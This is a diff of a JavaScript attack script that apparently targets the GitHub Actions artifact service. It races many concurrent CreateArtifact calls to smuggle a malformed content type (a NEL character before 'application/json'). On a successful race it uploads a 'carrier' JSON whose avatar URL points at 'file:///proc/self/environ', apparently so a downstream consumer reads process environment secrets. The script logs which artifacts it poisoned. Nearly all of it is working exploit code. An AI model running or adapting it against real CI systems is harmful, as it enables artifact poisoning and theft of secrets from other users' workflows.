@@ -8,33 +8,23 @@ import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index
 const ids = getBackendIdsFromToken();
 const client = internalArtifactTwirpClient({maxAttempts: 1});
 const odd = '\u0085application/json';
-const placeholder = Buffer.from('{"probe":"missing-mime"}');
+const placeholder = Buffer.from('{"probe":"contention"}');
 const hash = `sha256:${createHash('sha256').update(placeholder).digest('hex')}`;
 const winners = [];
+const COUNT = 96;
+const WIDTH = 16;
 
-const cases = [
-  ['omitted', request => request],
-  ['undefined', request => ({...request, mimeType: undefined})],
-  ['null', request => ({...request, mimeType: null})],
-  ['empty-wrapper', request => ({...request, mimeType: StringValue.create({})})],
-  ['empty-string', request => ({...request, mimeType: StringValue.create({value: ''})})],
-  ['space', request => ({...request, mimeType: StringValue.create({value: ' '})})],
-  ['tab', request => ({...request, mimeType: StringValue.create({value: '\t'})})],
-  ['json', request => ({...request, mimeType: StringValue.create({value: 'application/json'})})],
-];
-
-async function create(name, mutate) {
-  const base = {
-    workflowRunBackendId: ids.workflowRunBackendId,
-    workflowJobRunBackendId: ids.workflowJobRunBackendId,
-    name,
-    version: 7,
-  };
+async function create(name, version) {
+  const mimeType = version === 6 ? odd : 'application/json';
   try {
-    const value = await client.CreateArtifact(mutate(base));
-    return {ok: true, url: value.signedUploadUrl};
+    const value = await client.CreateArtifact({
+      workflowRunBackendId: ids.workflowRunBackendId,
+      workflowJobRunBackendId: ids.workflowJobRunBackendId,
+      name, version, mimeType: StringValue.create({value: mimeType}),
+    });
+    return {ok: true, url: value.signedUploadUrl, version};
   } catch (error) {
-    return {ok: false, error: String(error).slice(0, 240)};
+    return {ok: false, error: String(error).slice(0, 160), version};
   }
 }
 
@@ -56,7 +46,7 @@ async function finalize(name) {
     });
     return {ok: true, id: String(value.artifactId)};
   } catch (error) {
-    return {ok: false, error: String(error).slice(0, 200)};
+    return {ok: false, error: String(error).slice(0, 160)};
   }
 }
 
@@ -67,14 +57,9 @@ async function inspect(name) {
       workflowJobRunBackendId: ids.workflowJobRunBackendId,
       name,
     });
-    const response = await fetch(value.signedUrl);
-    return {
-      ok: true,
-      queryType: new URL(value.signedUrl).searchParams.get('rsct'),
-      servedType: response.headers.get('content-type'),
-    };
+    return {ok: true, contentType: new URL(value.signedUrl).searchParams.get('rsct')};
   } catch (error) {
-    return {ok: false, error: String(error).slice(0, 200)};
+    return {ok: false, error: String(error).slice(0, 160)};
   }
 }
 
@@ -82,43 +67,71 @@ function carrierBytes(repository) {
   return Buffer.from(JSON.stringify({
     full_name: repository,
     owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
-    description: 'Repo Cassette missing MIME carrier',
+    description: 'Repo Cassette contention carrier',
     stargazers_count: 0,
   }));
 }
 
-async function trial(index, label, mutate) {
-  const name = `missingmime-${process.env.GITHUB_RUN_ID}-${index}`;
-  const created = await create(name, mutate);
-  if (!created.ok) return {index, label, created};
-  await upload(created.url, placeholder).catch(() => false);
-  const final = await finalize(name);
-  const view = await inspect(name);
-  const raw = view.servedType || view.queryType || '';
-  const isOdd = raw.includes('\u0085');
+const groups = Array.from({length: COUNT}, (_, index) => ({
+  index,
+  name: `contention-${process.env.GITHUB_RUN_ID}-${index}`,
+  creates: [],
+}));
+
+// Put every request in one Promise.all so separate names also load the insert path.
+const requests = [];
+for (const group of groups) {
+  for (let attempt = 0; attempt < WIDTH; attempt++) {
+    const version = (attempt + group.index) % 2 === 0 ? 6 : 7;
+    requests.push(create(group.name, version).then(result => {
+      group.creates.push(result);
+      return result;
+    }));
+  }
+}
+await Promise.all(requests);
+
+await Promise.all(groups.map(async group => {
+  await Promise.all(group.creates.map(item => upload(item.url, placeholder).catch(() => false)));
+}));
+
+const rows = await Promise.all(groups.map(async group => {
+  const final = await finalize(group.name);
+  const view = await inspect(group.name);
+  const isOdd = view.contentType?.includes('\u0085') ?? false;
   const row = {
-    index, label, created: {ok: true}, final,
+    index: group.index,
+    created6: group.creates.filter(x => x.ok && x.version === 6).length,
+    created7: group.creates.filter(x => x.ok && x.version === 7).length,
+    errors: group.creates.filter(x => !x.ok).length,
+    final,
     view: view.ok ? {
       ok: true,
-      queryType: JSON.stringify(view.queryType).slice(1, -1),
-      servedType: JSON.stringify(view.servedType).slice(1, -1),
+      contentType: JSON.stringify(view.contentType).slice(1, -1),
     } : view,
     isOdd,
   };
   if (isOdd && final.id) {
     const repository = `${process.env.GITHUB_REPOSITORY}/actions/artifacts/${final.id}/zip`;
-    row.carrierPlaced = await upload(created.url, carrierBytes(repository)).catch(() => false);
+    const placed = await Promise.all(
+      group.creates.map(item => upload(item.url, carrierBytes(repository)).catch(() => false)),
+    );
     row.repository = repository;
-    if (row.carrierPlaced) winners.push({id: final.id, name, repository});
+    row.carrierPlaced = placed.some(Boolean);
+    if (row.carrierPlaced) winners.push({id: final.id, name: group.name, repository});
   }
+  console.log(`CONTENTION ${JSON.stringify(row)}`);
   return row;
-}
+}));
 
-const rows = await Promise.all(cases.map(([label, mutate], index) => trial(index, label, mutate)));
-for (const row of rows) console.log(`MISSINGMIME ${JSON.stringify(row)}`);
-const summary = {total: rows.length, accepted: rows.filter(r => r.created?.ok).length,
-  odd: rows.filter(r => r.isOdd).length};
-console.log(`MISSINGMIME_SUMMARY ${JSON.stringify(summary)}`);
+const summary = {
+  total: rows.length,
+  width: WIDTH,
+  odd: rows.filter(row => row.isOdd).length,
+  finalized: rows.filter(row => row.final?.ok).length,
+  bothVersions: rows.filter(row => row.created6 && row.created7).length,
+};
+console.log(`CONTENTION_SUMMARY ${JSON.stringify(summary)}`);
 writeFileSync('carrier-results.json', JSON.stringify({
   runId: process.env.GITHUB_RUN_ID,
   repository: process.env.GITHUB_REPOSITORY,
